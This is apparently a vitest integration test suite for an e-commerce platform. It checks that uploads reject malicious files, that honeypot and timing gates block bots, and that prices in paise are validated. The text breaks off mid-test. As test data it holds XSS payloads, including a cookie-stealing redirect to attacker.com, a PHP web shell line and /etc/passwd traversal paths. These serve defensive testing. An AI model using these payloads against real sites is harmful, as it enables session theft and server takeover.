/**
 * BHAIRAVI Creations Digital Platform
 * Adversarial Stress & Fuzzing Test Suite — Milestone 2 Challenger 2
 * Target: src/tests/integration/adversarial_upload_honeypot.test.ts
 *
 * EMPIRICAL ADVERSARIAL CHALLENGES:
 * 1. Malicious File Upload Fuzzing (F13 & F10):
 *    - Polyglot disguised SVGs (cat.jpg with <svg><script>alert(1)</script></svg>)
 *    - JPEG magic bytes followed by embedded SVG / script vectors
 *    - HTML script vectors (photo.png with <html><script>)
 *    - PNG magic bytes followed by script payloads
 *    - PHP script files (info.jpg with <?php phpinfo(); ?>)
 *    - Executable binary ELF (\x7fELF...) & Windows PE/EXE (MZ...)
 *    - Zero-magic byte / random byte corruption
 *    - Oversized file upload (> 5MB product image -> HTTP 413, > 10MB enquiry -> HTTP 413)
 *    - Directory traversal via multipart filename (../../../../etc/passwd.jpg)
 *    - Static serving traversal rejection (GET /uploads/products/../../../../etc/passwd)
 *    - Enquiry attachment fuzzing (SVG rejection, PDF/STL verification)
 *
 * 2. Honeypot Anti-Spam & Submission Timing Fuzzing (F14 & F11):
 *    - bhr_check_field bot submissions: synthetic 200 returned, ZERO rows written to SQLite
 *    - URL / text payloads in honeypot field
 *    - Whitespace honeypot field: treated as clean human submission
 *    - Duration gate: < 2.5s automated script submission -> HTTP 422
 *    - Duration gate: 0ms duration / exact match -> HTTP 422
 *    - Duration gate: future render timestamp -> HTTP 422
 *    - Duration gate: > 24 hours stale session -> HTTP 422
 *    - Missing or non-numeric render timestamp -> HTTP 422
 *
 * 3. Paise Math & Extreme Boundary Fuzzing (F10 & F9):
 *    - Negative paise (-100, -1) -> HTTP 400 rejection
 *    - Floating-point paise (1499.50, 99.99) -> HTTP 400 rejection
 *    - String paise ("five hundred", "1500") -> HTTP 400 rejection
 *    - Boundary: Zero paise (0) -> HTTP 201 accepted, format ₹0
 *    - Boundary: Number.MAX_SAFE_INTEGER paise -> HTTP 201 accepted
 *    - Variant modifier creating negative effective price -> HTTP 400 rejection
 *    - Zero-denominator KPI calculation: CTR, Outbound Rate, Storefront-to-Enquiry,
 *      and Completion Rate safely return 0.00% without NaN, Infinity, or crashes.
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import Database from 'better-sqlite3';
import { createDbConnection } from '../../server/db/connection.js';
import { runMigrations } from '../../server/db/migrator.js';
import { createApp } from '../../server/app.js';
import { authRateLimiter, enquiryRateLimiter } from '../../server/middleware/rate_limiter.js';
import { getUploadRootDirectory } from '../../server/services/upload.service.js';

const TEST_DB_PATH = path.resolve(process.cwd(), 'data/test_adversarial_m2.db');

/**
 * Helper to construct standard multipart/form-data body buffer.
 */
function buildMultipartBody(
  boundary: string,
  fields: Record<string, string>,
  files: Record<string, { filename: string; contentType: string; data: Buffer }>
): Buffer {
  const chunks: Buffer[] = [];
  for (const [key, val] of Object.entries(fields)) {
    chunks.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${val}\r\n`));
  }
  for (const [key, file] of Object.entries(files)) {
    chunks.push(
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="${key}"; filename="${file.filename}"\r\nContent-Type: ${file.contentType}\r\n\r\n`
      )
    );
    chunks.push(file.data);
    chunks.push(Buffer.from('\r\n'));
  }
  chunks.push(Buffer.from(`--${boundary}--\r\n`));
  return Buffer.concat(chunks);
}

describe('Milestone 2 Challenger 2: Adversarial Upload Security, Honeypot Bypass & Paise Math Fuzzing', () => {
  let db: Database.Database;
  let server: http.Server;
  let baseUrl: string;
  let adminCookie: string;
  let targetProductId: string;

  const testAdmin = {
    id: 'usr_adv_admin_01',
    username: 'adv_admin',
    email: 'adv_admin@bhairavicreations.test',
    password: 'AdvAdminPassword2026!',
    passwordHash: crypto.createHash('sha256').update('AdvAdminPassword2026!').digest('hex'),
    role: 'admin'
  };

  beforeAll(async () => {
    // 1. Initialize isolated adversarial test database
    const dbDir = path.dirname(TEST_DB_PATH);
    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });

    if (fs.existsSync(TEST_DB_PATH)) fs.unlinkSync(TEST_DB_PATH);
    if (fs.existsSync(`${TEST_DB_PATH}-wal`)) fs.unlinkSync(`${TEST_DB_PATH}-wal`);
    if (fs.existsSync(`${TEST_DB_PATH}-shm`)) fs.unlinkSync(`${TEST_DB_PATH}-shm`);

    db = createDbConnection(TEST_DB_PATH);
    runMigrations(db);

    // Seed test admin user
    db.prepare(`
      INSERT OR REPLACE INTO admin_users (id, username, email, password_hash, role, is_active, failed_login_attempts)
      VALUES (?, ?, ?, ?, ?, 1, 0)
    `).run(testAdmin.id, testAdmin.username, testAdmin.email, testAdmin.passwordHash, testAdmin.role);

    // 2. Start HTTP server on dynamic port
    const app = createApp(db);
    server = http.createServer(app);

    await new Promise<void>((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const address = server.address() as any;
        baseUrl = `http://127.0.0.1:${address.port}`;
        resolve();
      });
    });

    // 3. Authenticate admin user
    const loginRes = await fetch(`${baseUrl}/api/admin/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: testAdmin.username, password: testAdmin.password })
    });
    expect(loginRes.status).toBe(200);
    adminCookie = loginRes.headers.get('set-cookie') || '';
    expect(adminCookie).toBeTruthy();

    // 4. Create base product for image upload tests
    const prodRes = await fetch(`${baseUrl}/api/admin/products`, {
      method: 'POST',
      headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'Adversarial Test Target Product',
        category_id: 'cat_spiritual_deities',
        base_price_paise: 299900
      })
    });
    expect(prodRes.status).toBe(201);
    const prodJson = await prodRes.json();
    targetProductId = prodJson.data.id;
    expect(targetProductId).toBeTruthy();
  });

  afterAll(async () => {
    await new Promise<void>((resolve) => {
      server.close(() => resolve());
    });
    if (db && db.open) db.close();

    if (fs.existsSync(TEST_DB_PATH)) fs.unlinkSync(TEST_DB_PATH);
    if (fs.existsSync(`${TEST_DB_PATH}-wal`)) fs.unlinkSync(`${TEST_DB_PATH}-wal`);
    if (fs.existsSync(`${TEST_DB_PATH}-shm`)) fs.unlinkSync(`${TEST_DB_PATH}-shm`);
  });

  beforeEach(() => {
    // Reset in-memory rate limiters between tests to prevent throttling
    authRateLimiter.reset();
    enquiryRateLimiter.reset();
  });

  // ==========================================================================
  // Suite 1: Malicious File Upload Fuzzing & Vector Rejection (F13 & F10)
  // ==========================================================================
  describe('1. Malicious File Upload Fuzzing & Vector Rejection', () => {
    it('1.1 should reject polyglot SVG disguised with .jpg extension (HTTP 422)', async () => {
      const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>');

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: maliciousSvg.toString('base64'),
          alt_text: 'cat.jpg with embedded SVG script'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Security violation|SVG and HTML uploads are strictly disallowed/i);
    });

    it('1.2 should reject polyglot with genuine JPEG magic bytes followed by embedded SVG/script (HTTP 422)', async () => {
      // Valid JPEG header FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 followed by script vector
      const polyglotBuffer = Buffer.concat([
        Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01]),
        Buffer.from('<svg onload=alert("XSS")><script>evil()</script></svg>')
      ]);

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: polyglotBuffer.toString('base64'),
          alt_text: 'JPEG polyglot script injection'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Security violation|Prohibited script\/vector payload/i);
    });

    it('1.3 should reject raw HTML script injection disguised as photo.png (HTTP 422)', async () => {
      const htmlPayload = Buffer.from("<!doctype html><html><script>document.location='http://attacker.com/steal?c='+document.cookie</script></html>");

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: htmlPayload.toString('base64'),
          alt_text: 'photo.png with HTML redirection script'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Security violation|Prohibited script/i);
    });

    it('1.4 should reject PNG magic bytes with embedded HTML script injection (HTTP 422)', async () => {
      const pngPolyglot = Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from('<html><script>console.log("pwned")</script></html>')
      ]);

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: pngPolyglot.toString('base64'),
          alt_text: 'PNG polyglot XSS'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Security violation|Prohibited script/i);
    });

    it('1.5 should reject PHP code file disguised as info.jpg (HTTP 422)', async () => {
      const phpPayload = Buffer.from('<?php phpinfo(); system($_GET["cmd"]); ?>');

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: phpPayload.toString('base64'),
          alt_text: 'info.jpg PHP webshell'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Invalid file signature|Only authentic JPEG, PNG, or WebP/i);
    });

    it('1.6 should reject Linux executable ELF binary disguised as image (HTTP 422)', async () => {
      // ELF Magic bytes: 0x7F 0x45 0x4C 0x46
      const elfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: elfBuffer.toString('base64'),
          alt_text: 'Linux binary ELF upload'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Invalid file signature/i);
    });

    it('1.7 should reject Windows PE / EXE binary disguised as image (HTTP 422)', async () => {
      // DOS/PE Magic bytes: 'MZ' (0x4D 0x5A)
      const peBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00]);

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: peBuffer.toString('base64'),
          alt_text: 'Windows PE EXE trojan'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Invalid file signature/i);
    });

    it('1.8 should reject random zero/corrupted bytes with no magic headers (HTTP 422)', async () => {
      const randomCorrupted = crypto.randomBytes(512);

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: randomCorrupted.toString('base64'),
          alt_text: 'Corrupted random noise'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Invalid file signature/i);
    });

    it('1.9 should reject oversized 6MB file for product images (HTTP 413)', async () => {
      // Allocate 6MB buffer
      const oversizedBuffer = Buffer.alloc(6 * 1024 * 1024, 0x00);
      // Prepend valid JPEG magic bytes so it would otherwise pass format check
      oversizedBuffer[0] = 0xff;
      oversizedBuffer[1] = 0xd8;
      oversizedBuffer[2] = 0xff;
      oversizedBuffer[3] = 0xe0;

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          file_base64: oversizedBuffer.toString('base64'),
          alt_text: 'Oversized 6MB product image'
        })
      });

      expect(res.status).toBe(413);
      const json = await res.json();
      expect(json.error).toMatch(/exceeds maximum 5MB limit/i);
    });

    it('1.10 should defeat path traversal in multipart uploads by generating isolated UUID v4', async () => {
      const boundary = '----AdversarialBoundary' + crypto.randomBytes(8).toString('hex');
      const validJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01]);

      const multipartData = buildMultipartBody(
        boundary,
        { alt_text: 'Path Traversal Attack', is_primary: '0' },
        {
          file: {
            filename: '../../../../etc/passwd.jpg',
            contentType: 'image/jpeg',
            data: validJpeg
          }
        }
      );

      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}/images`, {
        method: 'POST',
        headers: {
          Cookie: adminCookie,
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        },
        body: new Uint8Array(multipartData)
      });

      expect(res.status).toBe(201);
      const json = await res.json();
      expect(json.success).toBe(true);
      expect(json.data.public_url).toBeTruthy();

      // Filename must NOT contain 'passwd' or '../' — must be UUID.jpg
      expect(json.data.public_url).not.toContain('passwd');
      expect(json.data.public_url).toMatch(/^\/uploads\/products\/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.jpg$/i);

      // Verify physical disk file is strictly inside products upload directory
      const uploadRoot = getUploadRootDirectory();
      const filename = path.basename(json.data.public_url);
      const storedDiskPath = path.resolve(uploadRoot, 'products', filename);
      expect(storedDiskPath.startsWith(uploadRoot)).toBe(true);
      expect(fs.existsSync(storedDiskPath)).toBe(true);
    });

    it('1.11 should reject directory traversal attempts on static file serving (HTTP 404)', async () => {
      // Attempt to traverse out of /uploads/products/ to /etc/passwd
      const traversalUrls = [
        `${baseUrl}/uploads/products/../../../../etc/passwd`,
        `${baseUrl}/uploads/products/..%2f..%2f..%2f..%2fetc%2fpasswd`,
        `${baseUrl}/uploads/products/passwd.jpg`,
        `${baseUrl}/uploads/enquiries/../../../package.json`
      ];

      for (const url of traversalUrls) {
        const res = await fetch(url);
        expect(res.status).toBe(404);
        const json = await res.json();
        expect(json.error).toBe('File not found');
      }
    });

    it('1.12 should reject SVG enquiry attachments even with clean filenames (HTTP 422)', async () => {
      const validRenderedAt = Date.now() - 4000;
      const svgAttachment = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>');

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Artisan Collector',
          contact_phone: '+91 98765 43210',
          project_type: 'custom_figurine',
          design_description: 'Custom miniature requiring SVG vector review.',
          rendered_at: validRenderedAt,
          attachment_base64: svgAttachment.toString('base64'),
          attachment_filename: 'model.svg'
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/SVG files are strictly disallowed|Security violation/i);
    });

    it('1.13 should reject enquiry attachments exceeding 10MB size limit (HTTP 413)', async () => {
      const validRenderedAt = Date.now() - 4000;
      // 11MB attachment buffer
      const largePdf = Buffer.alloc(11 * 1024 * 1024, 0x00);
      largePdf[0] = 0x25; // %
      largePdf[1] = 0x50; // P
      largePdf[2] = 0x44; // D
      largePdf[3] = 0x46; // F

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Heavy CAD Customer',
          contact_phone: '+91 98765 43210',
          project_type: 'architectural_model',
          design_description: 'Complex model blueprint exceeding 10MB attachment threshold.',
          rendered_at: validRenderedAt,
          attachment_base64: largePdf.toString('base64'),
          attachment_filename: 'large_blueprint.pdf'
        })
      });

      expect(res.status).toBe(413);
      const json = await res.json();
      expect(json.error).toMatch(/exceeds maximum 10MB limit/i);
    });

    it('1.14 should accept legitimate PDF and STL 3D models for custom order enquiries', async () => {
      const validRenderedAt = Date.now() - 4000;

      // 1. Valid PDF file (%PDF-1.4 header)
      const validPdf = Buffer.from('%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n>>\nendobj\ntrailer\n<<\n/Root 1 0 R\n>>\n%%EOF');
      const pdfRes = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Architectural Client',
          contact_phone: '+91 98111 22233',
          project_type: 'architectural_model',
          design_description: 'Technical CAD blueprint specifications for temple complex.',
          rendered_at: validRenderedAt,
          attachment_base64: validPdf.toString('base64'),
          attachment_filename: 'temple_spec.pdf'
        })
      });
      expect(pdfRes.status).toBe(201);
      const pdfJson = await pdfRes.json();
      expect(pdfJson.success).toBe(true);

      // Verify attachment record in database has detected mime 'application/pdf'
      const attRow = db.prepare('SELECT * FROM enquiry_attachments WHERE enquiry_id = ?').get(pdfJson.enquiry_id) as any;
      expect(attRow).toBeDefined();
      expect(attRow.mime_type).toBe('application/pdf');
      expect(attRow.original_filename).toBe('temple_spec.pdf');

      // 2. Valid STL 3D model (ASCII STL starting with "solid ")
      const validStl = Buffer.from('solid BhairaviGaneshaModel\nfacet normal 0 0 0\nouter loop\nvertex 0 0 0\nvertex 1 0 0\nvertex 0 1 0\nendloop\nendfacet\nendsolid BhairaviGaneshaModel');
      const stlRes = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: '3D Modeler Maker',
          contact_phone: '+91 98444 55566',
          project_type: 'custom_figurine',
          design_description: 'Original STL 3D mesh model ready for 0.12mm high-precision print.',
          rendered_at: validRenderedAt,
          attachment_base64: validStl.toString('base64'),
          attachment_filename: 'ganesha_mesh.stl'
        })
      });
      expect(stlRes.status).toBe(201);
      const stlJson = await stlRes.json();
      expect(stlJson.success).toBe(true);

      const stlAttRow = db.prepare('SELECT * FROM enquiry_attachments WHERE enquiry_id = ?').get(stlJson.enquiry_id) as any;
      expect(stlAttRow).toBeDefined();
      expect(stlAttRow.mime_type).toBe('model/stl');
    });
  });

  // ==========================================================================
  // Suite 2: Honeypot Anti-Spam & Submission Timing Fuzzing (F14 & F11)
  // ==========================================================================
  describe('2. Honeypot Anti-Spam & Submission Timing Fuzzing', () => {
    it('2.1 bot populating bhr_check_field with plain text must receive synthetic 200 and ZERO rows written to DB', async () => {
      const validRenderedAt = Date.now() - 4000;
      const initialCount = (db.prepare('SELECT COUNT(*) as count FROM enquiries').get() as any).count;
      const initialTimeline = (db.prepare('SELECT COUNT(*) as count FROM enquiry_timeline').get() as any).count;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Automated Bot Submitter',
          contact_phone: '+91 99999 00000',
          project_type: 'other',
          design_description: 'Spam payload advertising online gambling.',
          bhr_check_field: 'I am an automated scraping bot',
          rendered_at: validRenderedAt
        })
      });

      // Synthetic 200/202 success disguise to prevent bot reconnaissance
      expect(res.status).toBe(200);
      const json = await res.json();
      expect(json.success).toBe(true);
      expect(json.message).toContain('received');
      expect(json.enquiry_id).toBeTruthy();

      // STRICT EMPIRICAL CHECK: ZERO rows written to database
      const finalCount = (db.prepare('SELECT COUNT(*) as count FROM enquiries').get() as any).count;
      const finalTimeline = (db.prepare('SELECT COUNT(*) as count FROM enquiry_timeline').get() as any).count;
      expect(finalCount).toBe(initialCount);
      expect(finalTimeline).toBe(initialTimeline);

      // Verify synthetic ID is NOT in the database
      const findSynthetic = db.prepare('SELECT * FROM enquiries WHERE id = ?').get(json.enquiry_id);
      expect(findSynthetic).toBeUndefined();
    });

    it('2.2 bot populating bhr_check_field with spam URL must receive synthetic 200 and ZERO rows written to DB', async () => {
      const validRenderedAt = Date.now() - 5000;
      const initialCount = (db.prepare('SELECT COUNT(*) as count FROM enquiries').get() as any).count;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'SEO Spammer',
          contact_phone: '+91 98888 77777',
          project_type: 'other',
          design_description: 'High PR backlinks available here now.',
          bhr_check_field: 'https://spam-rankings.example.com/backlinks',
          rendered_at: validRenderedAt
        })
      });

      expect(res.status).toBe(200);
      const json = await res.json();
      expect(json.success).toBe(true);

      const finalCount = (db.prepare('SELECT COUNT(*) as count FROM enquiries').get() as any).count;
      expect(finalCount).toBe(initialCount);
    });

    it('2.3 submission with whitespace-only honeypot field is treated as clean and accepted (HTTP 201)', async () => {
      const validRenderedAt = Date.now() - 3500;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Legitimate Customer with Whitespace',
          contact_phone: '+91 91234 56789',
          project_type: 'custom_figurine',
          design_description: 'Custom handcrafted statue for anniversary celebration.',
          bhr_check_field: '   ', // whitespace only
          rendered_at: validRenderedAt
        })
      });

      expect(res.status).toBe(201);
      const json = await res.json();
      expect(json.success).toBe(true);

      // Verify row WAS stored in database
      const row = db.prepare('SELECT * FROM enquiries WHERE id = ?').get(json.enquiry_id) as any;
      expect(row).toBeDefined();
      expect(row.customer_name).toBe('Legitimate Customer with Whitespace');
    });

    it('2.4 duration gate: submissions completed in < 2.5s must be rejected as automated scripts (HTTP 422)', async () => {
      // 500ms elapsed (< 2500ms duration gate)
      const fastRenderedAt = Date.now() - 500;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Speed Submitter Bot',
          contact_phone: '+91 99999 11111',
          project_type: 'lithophane',
          design_description: 'Ultra-fast headless script submission in 500ms.',
          bhr_check_field: '',
          rendered_at: fastRenderedAt
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Automated script detected: submission completed in < 2\.5s/i);

      // Verify no row created in DB
      const row = db.prepare("SELECT * FROM enquiries WHERE customer_name = 'Speed Submitter Bot'").get();
      expect(row).toBeUndefined();
    });

    it('2.5 duration gate: submissions with 0ms or future render timestamps must be rejected (HTTP 422)', async () => {
      // Future render timestamp (render time in future -> durationMs < 0 < 2500)
      const futureRenderedAt = Date.now() + 10000;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Time Traveler Bot',
          contact_phone: '+91 99999 22222',
          project_type: 'other',
          design_description: 'Submission with timestamp from 10 seconds into the future.',
          bhr_check_field: '',
          rendered_at: futureRenderedAt
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Automated script detected/i);
    });

    it('2.6 duration gate: submissions exceeding 24 hours stale session must be rejected (HTTP 422)', async () => {
      // 25 hours ago (> 24 hours / 86,400,000ms threshold)
      const staleRenderedAt = Date.now() - 25 * 3600 * 1000;

      const res = await fetch(`${baseUrl}/api/enquiries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_name: 'Stale Session Replay',
          contact_phone: '+91 99999 33333',
          project_type: 'custom_figurine',
          design_description: 'Submitting yesterday tab left open for 25 hours.',
          bhr_check_field: '',
          rendered_at: staleRenderedAt
        })
      });

      expect(res.status).toBe(422);
      const json = await res.json();
      expect(json.error).toMatch(/Submission timestamp expired \(> 24h\)/i);
    });

    it('2.7 duration gate: submissions with missing, null, or non-numeric rendered_at must be rejected (HTTP 422)', async () => {
      const invalidRenderCases = [
        undefined,
        null,
        '',
        'not_a_number',
        '2026-10-31T12:00:00Z_invalid'
      ];

      for (const badRenderedAt of invalidRenderCases) {
        const res = await fetch(`${baseUrl}/api/enquiries`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            customer_name: 'Malformed Timestamp Tester',
            contact_phone: '+91 99999 44444',
            project_type: 'other',
            design_description: 'Testing timestamp parsing robustness against bad input.',
            bhr_check_field: '',
            rendered_at: badRenderedAt
          })
        });

        expect(res.status).toBe(422);
        const json = await res.json();
        expect(json.error).toMatch(/render timestamp/i);
      }
    });
  });

  // ==========================================================================
  // Suite 3: Paise Math & Extreme Boundary Fuzzing (F10 & F9)
  // ==========================================================================
  describe('3. Paise Math & Extreme Boundary Fuzzing', () => {
    it('3.1 should strictly reject negative paise during product creation (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Negative Paise Product',
          category_id: 'cat_spiritual_deities',
          base_price_paise: -100
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.2 should strictly reject negative paise during product update (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}`, {
        method: 'PUT',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          base_price_paise: -1
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.3 should strictly reject floating-point paise during product creation (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Floating Paise Product',
          category_id: 'cat_spiritual_deities',
          base_price_paise: 1499.50
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.4 should strictly reject floating-point paise during product update (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products/${targetProductId}`, {
        method: 'PUT',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          base_price_paise: 99.99
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.5 should strictly reject non-numeric string paise during product creation (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'String Paise Product',
          category_id: 'cat_spiritual_deities',
          base_price_paise: 'five hundred'
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.6 should strictly reject numeric string paise during product creation (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Numeric String Paise Product',
          category_id: 'cat_spiritual_deities',
          base_price_paise: '1500'
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/non-negative integer/i);
    });

    it('3.7 boundary: should accept zero paise (0) for promotional/free sample product (HTTP 201)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Free Material Swatch Sample',
          category_id: 'cat_spiritual_deities',
          base_price_paise: 0
        })
      });

      expect(res.status).toBe(201);
      const json = await res.json();
      expect(json.success).toBe(true);

      // Verify row stored with exact integer 0
      const row = db.prepare('SELECT base_price_paise FROM products WHERE id = ?').get(json.data.id) as any;
      expect(row.base_price_paise).toBe(0);
    });

    it('3.8 boundary: should accept maximum safe integer paise (Number.MAX_SAFE_INTEGER) (HTTP 201)', async () => {
      const maxPaise = Number.MAX_SAFE_INTEGER;

      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Priceless Masterpiece Idol',
          category_id: 'cat_spiritual_deities',
          base_price_paise: maxPaise
        })
      });

      expect(res.status).toBe(201);
      const json = await res.json();
      expect(json.success).toBe(true);

      const row = db.prepare('SELECT base_price_paise FROM products WHERE id = ?').get(json.data.id) as any;
      expect(row.base_price_paise).toBe(maxPaise);
    });

    it('3.9 should reject variant price modifiers that result in a negative effective price (HTTP 400)', async () => {
      const res = await fetch(`${baseUrl}/api/admin/products`, {
        method: 'POST',
        headers: { Cookie: adminCookie, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: 'Negative Effective Price Product',
          category_id: 'cat_spiritual_deities',
          base_price_paise: 50000, // ₹500
          variants: [
            {
              sku: 'VAR-NEG-01',
              variant_name: 'Excessive Discount Variant',
              price_modifier_paise: -60000 // -₹600 -> effective price ₹-100 (INVALID!)
            }
          ]
        })
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.error).toMatch(/effective price cannot be negative/i);
    });

    it('3.10 zero-denominator KPI calculation: all conversion rates safely return 0.00% without NaN or Infinity', async () => {
      // 1. Ensure zero analytics events in the queried window
      db.prepare('DELETE FROM analytics_events').run();
      db.prepare('DELETE FROM daily_product_rollups').run();
